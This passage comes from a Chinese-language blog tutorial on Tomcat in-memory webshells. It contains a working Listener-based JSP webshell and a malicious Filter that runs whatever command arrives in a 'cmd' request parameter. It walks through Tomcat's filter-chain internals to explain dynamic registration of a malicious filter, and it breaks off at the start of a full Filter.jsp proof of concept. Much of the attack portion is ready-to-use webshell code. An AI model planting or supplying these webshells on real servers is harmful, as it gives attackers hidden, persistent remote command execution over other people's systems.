class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>测试前，先将之前的Listener删除，先直接尝试命令执行，发现弹计算器失败，再访问一下Listener.jsp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010211631.png" srcset="/img/loading.gif" lazyload alt="image-20230201021155544"></p>
+<p>此时Shell_Listener已经被加载进服务器，再次尝试弹计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010212384.png" srcset="/img/loading.gif" lazyload alt="image-20230201021249301"></p>
+<h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener的思路，实现一个恶意Filter。Filter的调用是通过FilterChain实现的，具体流程如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010214825.png" srcset="/img/loading.gif" lazyload alt="image-20230201021445758"></p>
+<blockquote>
+<p>只要重写doFilter方法即可</p>
+</blockquote>
+<p>恶意Filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span> <span class="hljs-comment">//应用到所有路由</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | NullPointerException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010219311.png" srcset="/img/loading.gif" lazyload alt="image-20230201021930234"></p>
+<h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter(); <span class="hljs-comment">//获取Filter</span><br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<span class="hljs-comment">//* doFilter的调用</span><br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看一下获取Filter的机制，<code>filterConfig</code>是<code>filters</code>数组成员，一个<code>ApplicationFilterConfig</code>实例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br><span class="hljs-comment">//...</span><br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure>
+
+<p>跟进查看一下<code>filters</code>数组的赋值时机,在<code>StandardWrapperValve#invoke()</code>方法中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>  <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">// Create the filter chain for this request</span><br>  <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>createFilterChain</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>(); <span class="hljs-comment">//创建一个空的filterChain</span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<span class="hljs-comment">//得到StandardContext</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<span class="hljs-comment">//获取其中的FilterMaps,里面存储里各Filter的信息</span><br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<span class="hljs-comment">//获取名称</span><br> <br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="hljs-comment">//遍历得到对应FilterConfig</span><br>            <span class="hljs-comment">//...</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-comment">//...</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> filterChain;<span class="hljs-comment">//将获取到的ApplicationFilterConfig整合返回</span><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>ApplicationFilterChain#addFilter</code>看一下添加机制</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br>        <span class="hljs-comment">//防止重复添加</span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Filter动态注册"><a href="#Filter动态注册" class="headerlink" title="Filter动态注册"></a>Filter动态注册</h4><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p>
+<p>这里先说一个前提条件，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
+<ol>
+<li>使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；</li>
+<li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</li>
+<li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）。</li>
+</ol>
+<p>这里只讨论第一种，并先关注比较重要的addFilter方法</p>
+<p>在<code>ServletContext</code>接口中有声明了3个<code>addFilter</code>方法，其实现在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。这里以Tomcat 10.0.23为例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName,</span><br><span class="hljs-params">        String filterClass, Filter filter)</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<span class="hljs-comment">//filterName不能为空</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<br>                <span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br>  <span class="hljs-comment">//这里的context是StandardContext类型</span><br>    <span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="hljs-comment">//判断context的state是否是程序刚启动的state</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                sm.getString(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>,<br>                        getContextPath()));<br>    &#125;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> context.findFilterDef(filterName);<span class="hljs-comment">//在context中根据 filterName 寻找FilterDef对象</span><br>    <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>        filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterName(filterName);<br>        context.addFilterDef(filterDef);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp;<br>                filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>		<span class="hljs-comment">//将Filter对象放入FilterDef中</span><br>    <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>        filterDef.setFilterClass(filterClass);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        filterDef.setFilter(filter);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="hljs-comment">//包装FilterDef和context返回</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>从传参可以看出filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>,动调一下会发现其实filterClass、filterName对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>并且可以发现<code>ApplicationContext </code>的 <code>addFilter</code> 中将 filter 初始化存在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中,但我们之前分析的<code>FilterChain</code>中的Filter是在<code>StandardContext</code>的<code>filterMaps</code>里获取</p>
+<p>这里可以跟进看一下Filter是怎么被添加到其他参数中的</p>
+</blockquote>
+<p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterStart</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>            getLogger().debug(<span class="hljs-string">&quot;Starting filters&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// Instantiate and record a FilterConfig for each defined filter</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">ok</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> (filterConfigs) &#123;<br>            filterConfigs.clear();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="hljs-comment">//遍历filterDefs</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey();<br>                <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>                    getLogger().debug(<span class="hljs-string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//创建ApplicationFilterConfig对象并存入filterConfigs中</span><br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue());<br>                    filterConfigs.put(name, filterConfig);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    t = ExceptionUtils.unwrapInvocationTargetException(t);<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.filterStart&quot;</span>, name), t);<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ok;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>完成<code>filterDefs</code>–&gt;<code>filterConfigs</code></p>
+</blockquote>
+<p>在 ApplicationFilterRegistration 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addMappingForUrlPatterns</span><span class="hljs-params">(</span><br><span class="hljs-params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="hljs-type">boolean</span> isMatchAfter,</span><br><span class="hljs-params">            String... urlPatterns)</span> &#123;<br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(filterDef.getFilterName());<span class="hljs-comment">//从filterDef获取</span><br>        <span class="hljs-keyword">if</span> (dispatcherTypes != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;<br>                filterMap.setDispatcher(dispatcherType.name());<span class="hljs-comment">//给dispatcherMapping属性赋值</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (urlPatterns != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String urlPattern : urlPatterns) &#123;<br>                filterMap.addURLPattern(urlPattern);<span class="hljs-comment">//给urlPatterns属性赋值</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isMatchAfter) &#123;<br>                context.addFilterMap(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                context.addFilterMapBefore(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>fileMap从filterDef中获取了<code>FilterName</code>属性，后续又赋值了<code>urlPatterns</code>,<code>dispatcherMapping</code></p>
+<blockquote>
+<p>可以看到<code>filterMaps</code>的组成部分<code>filterMap</code>的信息是从filterDef中获取</p>
+</blockquote>
+<p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p>
+<ol>
+<li>获取StandardContext对象</li>
+<li>创建恶意Filter</li>
+<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>
+<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>
+<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li>
+</ol>
+<h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h4><p>Filter.jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span 